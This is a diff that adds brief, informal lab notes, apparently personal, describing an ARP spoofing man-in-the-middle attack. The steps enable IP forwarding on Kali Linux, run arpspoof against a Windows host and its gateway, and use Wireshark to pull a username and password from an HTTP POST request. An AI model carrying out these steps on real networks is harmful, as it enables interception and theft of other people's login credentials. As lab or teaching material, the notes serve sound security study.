@@ -1,0 +1,15 @@
+-1st on windows
+terminal>>arp -a     #note win_ip and interface_ip
+chrome-vulweb-username&password
+
+
+-2nd on kali linux
+terminal>>echo 1 > /proc/sys/net/ipv4/ip_forward
+           >>arpspoof -i eth0 -t win_ip interface_ip               (windows and kali linux)
+
+
+apllication on top left-sniffing & spoofing - wireshark
+                  -double click(eth0)-search:http-go to browser-login details
+                  -(kali)double click POST row -HTML from URL encode.
+ 
+username and password will be obtained in kali linux os.
